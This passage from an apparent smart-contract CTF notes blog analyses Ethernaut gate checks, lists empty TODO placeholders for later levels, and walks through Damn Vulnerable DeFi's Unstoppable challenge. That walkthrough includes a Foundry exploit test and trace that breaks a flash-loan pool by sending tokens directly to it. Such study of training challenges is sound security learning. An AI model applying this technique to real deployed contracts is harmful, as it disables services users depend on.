</span></span><span style="display:flex;"><span>            <span style="color:#728e00">require</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#00979d">uint64</span>(<span style="color:#00979d">bytes8</span>(<span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)))) <span style="color:#728e00">^</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>) <span style="color:#728e00">==</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#00979d">uint64</span>(<span style="color:#8a7b52">0</span>) <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>
</span></span><span style="display:flex;"><span>            );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">enter</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateOne</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateTwo</span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">gateThree</span>(<span style="color:#434f54">_gateKey</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">entrant</span> <span style="color:#728e00">=</span> <span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis &amp; Solution</p>
 <!--list-separator-->
<ul>
<li>
<p>Gate 1</p>
<p>We already know how to pass the <strong>gateOne</strong> &ndash; by using an
intermediate contract.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>Gate 2</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">modifier</span> <span style="color:#d35400">gateTwo</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">x</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">assembly</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">x</span> <span style="color:#728e00">:=</span> <span style="color:#d35400">extcodesize</span>(<span style="color:#d35400">caller</span>())
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">require</span>(<span style="color:#434f54">x</span> <span style="color:#a61717">==</span> <span style="color:#8a7b52">0</span>)<span style="color:#a61717">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_</span><span style="color:#a61717">;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>Gate 3</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">modifier</span> <span style="color:#d35400">gateThree</span>(<span style="color:#00979d">bytes8</span> <span style="color:#434f54">_gateKey</span>) {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#00979d">unchecked</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(
</span></span><span style="display:flex; background-color:#e5e5e5"><span>            <span style="color:#00979d">uint64</span>(<span style="color:#00979d">bytes8</span>(<span style="color:#728e00">keccak256</span>(<span style="color:#728e00">abi</span>.<span style="color:#728e00">encodePacked</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>)))) <span style="color:#728e00">^</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>                <span style="color:#00979d">uint64</span>(<span style="color:#434f54">_gateKey</span>) <span style="color:#728e00">==</span>
</span></span><span style="display:flex; background-color:#e5e5e5"><span>                <span style="color:#00979d">uint64</span>(<span style="color:#8a7b52">0</span>) <span style="color:#728e00">-</span> <span style="color:#8a7b52">1</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">_</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #16 Naught Coin</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #17 Preservation</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #18 Recovery</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #19 MagicNumber</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #20 Alien Codex</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #21 Denial</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #22 Shop</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #23 Dex</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #24 Dex2</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #25 Puzzle Wallet</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo TODO">TODO</span>  Ethernaut, #26 Motorbike</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div>  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>Lessons learned</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>    -   
    
    ---
</code></pre>
<h4 id="etherhack">
  Etherhack <span class="tag"><span class="etherhack">etherhack</span></span>
  <a class="heading-link" href="#etherhack">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #1 Azino 777</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #2 Private Ryan</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #3 Wheel of Fortune</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #4 Call Me Maybe</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #5 The Lock</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  EtherHack, #6 Pirate Ship</li>
</ul>
<h4 id="damn-vulnerable-defi-damn-vuln-defi">
  Damn Vulnerable DeFi :damn-vuln-defi:
  <a class="heading-link" href="#damn-vulnerable-defi-damn-vuln-defi">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Damn Vulnerable DeFi, #1 Unstoppable</p>
  <div class="quote2">
<p>There are only a few days left to prepare for the
<a href="https://ctf.paradigm.xyz/"  class="external-link" target="_blank" rel="noopener">Paradigm CTF 2022</a>. Hence I&rsquo;m
going to spend this time solving the
<a href="https://www.damnvulnerabledefi.xyz/"  class="external-link" target="_blank" rel="noopener">Damn Vulnerable DeFi</a>
challenges and then concentrate on playing the
<a href="https://github.com/paradigmxyz/paradigm-ctf-2021"  class="external-link" target="_blank" rel="noopener">Paradigm CTF
2021</a>.</p>
  </div>
  <!--list-separator-->
<ul>
<li>
<p>Intro</p>
<p><a href="https://www.damnvulnerabledefi.xyz/"  class="external-link" target="_blank" rel="noopener">Damn Vulnerable DeFi</a> is
a CTF that simulates DeFi vulnerabilities created by
<a href="https://twitter.com/tinchoabbate"  class="external-link" target="_blank" rel="noopener">@tinchoabbate</a>. This game
has 13 different levels featuring popular DeFi primitives such
as lash loans, price oracles, governance, lending pools,
integrations with Uniswap v2, Gnosis Safe wallets, timelocks,
NFTs, upgradeability patterns and more. It is fun and enojoyable
way to learn DeFi-related offensive security. Needless to say it
requires some level of understanding of high level concepts
behind those DeFi protocols.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Setup</p>
<p><a href="https://github.com/tinchoabbate/damn-vulnerable-defi"  class="external-link" target="_blank" rel="noopener">Here</a>
is the original refactored game repo that uses
<a href="https://hardhat.org/"  class="external-link" target="_blank" rel="noopener">hardhat</a> +
<a href="https://docs.ethers.io/v5/single-page/"  class="external-link" target="_blank" rel="noopener">ethers</a>, but I&rsquo;m
going to play using the
<a href="https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry"  class="external-link" target="_blank" rel="noopener">foundry
version</a> of it.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
<ul>
<li>The <code>UnstoppableLender</code> contract offers flash loans in DVT
(ERC20) tokens for free.</li>
<li>It has 1000000 DVT in balance.</li>
<li>We must solve this challenge by disabling functionality of this
contract &ndash; stop the pool from offering flash loans.</li>
<li>We start with 100 DVT tokens in balance.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>There are two contracts in this challenge:</p>
<ul>
<li><a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/Contracts/unstoppable/UnstoppableLender.sol#L11"  class="external-link" target="_blank" rel="noopener">UnstoppableLender</a>.</li>
<li><a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/Contracts/unstoppable/ReceiverUnstoppable.sol#L12"  class="external-link" target="_blank" rel="noopener">ReceiverUnstoppable</a>.</li>
</ul>
<p>The <code>UnstoppableLender</code> inherits from the
<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
and each <code>external</code> function has the <code>nonReentrant</code> modifier.
Let&rsquo;s have a look at contract&rsquo;s state variables:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">IERC20</span> <span style="color:#728e00">public</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">damnValuableToken</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">poolBalance</span>;
</span></span></code></pre></div><ul>
<li><code>damnValuableToken</code> is DVT ERC20 token.</li>
<li><code>poolBalance</code> is used for accounting and stores the sum of all deposits.</li>
</ul>
<p>Now, let&rsquo;s go over external functions:</p>
<p><strong>depositTokens</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">depositTokens</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustDepositOneTokenMinimum</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Transfer token from sender. Sender must have first approved them.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">transferFrom</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>), <span style="color:#434f54">amount</span>);
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">+</span> <span style="color:#434f54">amount</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It requires the deposit of at least 1 DVT.</li>
<li>Assumes that the <code>msg.sender</code> has <code>approve</code>&rsquo;d the <code>amount</code>.</li>
<li>Updates the <code>poolBalance</code> so it reflects the total amount of
DVT&rsquo;s in a pool.</li>
</ul>
<p>For some reason this contract keeps track of its DVT balance in
the <code>poolBalance</code> storage variable instead of relying on the
<code>dvt.balanceOf</code> function. Let&rsquo;s keep this in mind.</p>
<p><strong>flashLoan</strong></p>
<p>Our challenge is to disable this function. Let&rsquo; take a look at it:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">function</span> <span style="color:#d35400">flashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">external</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">borrowAmount</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">MustBorrowOneTokenMinimum</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceBefore</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotEnoughTokensInPool</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Ensured by the protocol via the `depositTokens` function
</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">poolBalance</span> <span style="color:#728e00">!=</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">AssertionViolated</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">damnValuableToken</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">borrowAmount</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">IReceiver</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">receiveTokens</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span>(<span style="color:#434f54">damnValuableToken</span>),
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">borrowAmount</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">=</span> <span style="color:#434f54">damnValuableToken</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balanceAfter</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">FlashLoanHasNotBeenPaidBack</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>It takes the <code>borrowAmount</code> argument.</li>
<li>It checks that the balance of the borrowed token DVT is
greater than or equal to the <code>borrowAmount</code>.</li>
<li>It ensures that the <code>poolBalance</code> is equal to the <code>balanceBefore</code>.</li>
</ul>
<p>👀 The problem is this line:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">if</span> (<span style="color:#434f54">poolBalance</span> <span style="color:#728e00">!=</span> <span style="color:#434f54">balanceBefore</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">AssertionViolated</span>();
</span></span></code></pre></div><p>It is possible to transfer ERC20 tokens to any EOA/contract.
Hence we can directly send some DVT&rsquo;s to the <code>UnstoppableLender</code>
(without calling the <code>depositTokens</code> function) and break the
equality check above.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>Sending just 1 DVT is enough:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">unstoppableLender</span>), <span style="color:#8a7b52">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">expectRevert</span>(<span style="color:#434f54">UnstoppableLender</span>.<span style="color:#434f54">AssertionViolated</span>.<span style="color:#728e00">selector</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here is the trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract Unstoppable -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Levels/unstoppable/Unstoppable.t.sol:Unstoppable
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testExploit<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 44892<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Logs:
</span></span><span style="display:flex;"><span>  🧨 PREPARED TO BREAK THINGS 🧨
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>44892<span style="color:#728e00">]</span> Unstoppable::testExploit<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>Attacker: <span style="color:#728e00">[</span>0x9af2e2b7e57c1cd7c68c5c3796d8ea67e0018db7<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>12870<span style="color:#728e00">]</span> DVT::transfer<span style="color:#728e00">(</span>Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, 1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit Transfer<span style="color:#728e00">(</span>from: Attacker: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, to: Unstoppable Lender: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, value: 1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::expectRevert<span style="color:#728e00">(</span>AssertionViolated<span style="color:#728e00">())</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>User: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>11550<span style="color:#728e00">]</span> Receiver Unstoppable::executeFlashLoan<span style="color:#728e00">(</span>10<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>8416<span style="color:#728e00">]</span> Unstoppable Lender::flashLoan<span style="color:#728e00">(</span>10<span style="color:#728e00">)</span>
